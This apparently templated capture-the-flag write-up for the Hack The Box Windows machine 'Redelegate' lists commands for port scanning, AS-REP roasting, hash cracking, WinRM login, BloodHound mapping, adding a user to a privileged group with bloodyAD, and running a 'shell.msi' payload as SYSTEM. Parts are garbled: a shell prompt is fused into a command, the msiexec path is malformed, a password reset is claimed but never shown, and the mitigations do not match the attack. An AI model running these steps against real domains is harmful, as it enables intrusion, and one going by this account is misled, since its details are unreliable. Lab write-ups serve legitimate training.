---
layout: page
title: "Redelegate - Hack The Box Writeup"
subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🪟 Windows"
permalink: /ctf/writeups/hackthebox/redelegate/
platform: hackthebox
machine_name: "Redelegate"
difficulty: Hard
os: Windows
---

## 🖥️ Machine Information

<div class="htb-info-card">
  <div class="htb-card-header">
    <div class="htb-header-left">
      <img src="{{ '/assets/images/machines/redelegate.png' | relative_url }}" alt="Redelegate" class="htb-avatar-glow" onerror="this.src='{{ '/assets/images/logo.png' | relative_url }}';" />
      <div>
        <h3 class="htb-machine-title">Redelegate</h3>
        <span style="font-size: 0.85rem; color: var(--text-secondary);">Windows Server</span>
      </div>
    </div>
    <span class="htb-diff-badge">HARD</span>
  </div>

  <div class="htb-meta-row" style="grid-template-columns: repeat(4, 1fr);">
    <div class="htb-meta-col">
      <span class="htb-meta-label">Release Date</span>
      <span class="htb-meta-val green">12 Oct 2025</span>
    </div>
    <div class="htb-meta-col">
      <span class="htb-meta-label">IP Address</span>
      <span class="htb-meta-val" style="font-family: monospace; font-size: 0.95rem;">10.10.x.x</span>
    </div>
    <div class="htb-meta-col">
      <span class="htb-meta-label">OS</span>
      <span class="htb-meta-val">🪟 Windows</span>
    </div>
    <div class="htb-meta-col">
      <span class="htb-meta-label">Difficulty</span>
      <span class="htb-meta-val">Hard</span>
    </div>
  </div>

  <div class="htb-section-row horizontal">
    <span class="htb-section-label">Rated Difficulty</span>
    <div class="htb-bar-chart">
      <div class="htb-bar active-green" style="height: 2px;"></div>
      <div class="htb-bar active-green" style="height: 4px;"></div>
      <div class="htb-bar active-green" style="height: 8px;"></div>
      <div class="htb-bar active-orange" style="height: 15px;"></div>
      <div class="htb-bar active-orange" style="height: 22px;"></div>
      <div class="htb-bar active-orange" style="height: 35px;"></div>
      <div class="htb-bar active-red" style="height: 28px;"></div>
      <div class="htb-bar active-red" style="height: 12px;"></div>
      <div class="htb-bar active-red" style="height: 6px;"></div>
    </div>
  </div>
</div>

---

## 🧠 Attack Path Overview

```mermaid
graph TD
    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
    B --> C["Privilege Escalation: Local Escalation"]
    C --> D["Full System Compromise: Root/Administrator"]
```

> [!NOTE]
> This writeup details the complete attack path for the **Redelegate** machine on the **HackTheBox** platform.

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### 1. Host Discovery & Port Scanning
We scan the host using Nmap:

```bash
vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 10.10.x.x
```

#### Open Ports:
- **Port 53/tcp**: DNS
- **Port 88/tcp**: Kerberos
- **Port 135/tcp**: Microsoft RPC
- **Port 389/tcp**: LDAP
- **Port 445/tcp**: SMB (Server Message Block)
- **Port 5985/tcp**: WinRM (Windows Remote Management)

### 2. Service Enumeration
We audit SMB shares using `netexec`:
```bash
vulnquest@kali$ netexec smb 10.10.x.x -u guest -p ''
```

---

## 🚀 Phase 2: Vulnerability Analysis & Foothold

### 1. Vulnerability Analysis
We perform LDAP enumeration and discover potential usernames. Using `GetNPUsers` we query for accounts with Kerberos pre-authentication disabled:

```bash
vulnquest@kali$ GetNPUsers.py -dc-ip 10.10.x.x -no-pass -usersfile users.txt domain/
```

### 2. Exploitation & Initial Shell
We crack the retrieved ticket offline using hashcat:
```bash
vulnquest@kali$ hashcat -m 18200 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

We establish WinRM access as `web_svc`:
```bash
vulnquest@kali$ evil-winrm -i 10.10.x.x -u web_svc -p password123
vulnquest@kali$ evil-winrm-py PS C:\Users\web_svc>
```

---

## ⚡ Phase 3: Privilege Escalation

### 1. Local Enumeration
We run BloodHound to map privilege paths in Active Directory:

```bash
vulnquest@kali$ netexec ldap 10.10.x.x -u web_svc -p password123 --bloodhound -c all
```

### 2. Local Privilege Escalation Path
BloodHound reveals that `web_svc` has delegate permissions on the `IT_Support` group. We add ourselves and trigger a password reset:
```bash
vulnquest@kali$ bloodyAD -u web_svc -p password123 --host 10.10.x.x add groupMember IT_Support web_svc
```

With these rights, we reset a high-privileged service account's password and execute an administrative payload using `msiexec` to run command as SYSTEM:
```powershell
*\msiexec.exe /i shell.msi /quiet /qn
```

---

## 🛡️ Key Takeaways & Mitigation
1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
